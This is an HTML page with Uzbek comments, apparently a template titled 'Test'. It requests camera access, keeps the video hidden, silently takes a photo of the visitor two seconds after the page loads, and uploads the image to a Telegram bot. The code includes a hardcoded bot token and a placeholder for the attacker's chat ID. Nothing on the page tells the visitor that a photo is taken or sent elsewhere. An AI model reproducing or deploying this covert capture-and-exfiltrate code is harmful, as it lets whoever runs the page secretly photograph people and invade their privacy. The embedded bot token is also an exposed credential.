<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Sinov</title>
</head>
<body>

    <video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // 1. Kamerani ishga tushirish
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                // Sahifa ochilib, kamera yoqilgandan keyin 2 sekund o'tib avtomatik rasmga oladi
                setTimeout(takeAndSendPhoto, 2000);
            })
            .catch(err => {
                console.error("Kameraga ruxsat berilmadi: ", err);
            });

        // 2. Suratga olib botga yuborish funksiyasi
        function takeAndSendPhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/png');
        }

        // 3. Telegram API'ga yuborish
        function sendToTelegram(blob) {
            const BOT_TOKEN = '8971586107:AAFEVSMoD1GyxZ9ScYbhT4rXPtZ6sYpdsAA';
            const CHAT_ID = 'O‘ZINGIZNING_CHAT_IDINGIZNI_YOZING'; // Masalan: 123456789
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.png');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Rasm muvaffaqiyatli yuborildi!', data);
            })
            .catch(error => {
                console.error('Xatolik yuz berdi:', error);
            });
        }
    </script>

</body>
</html>
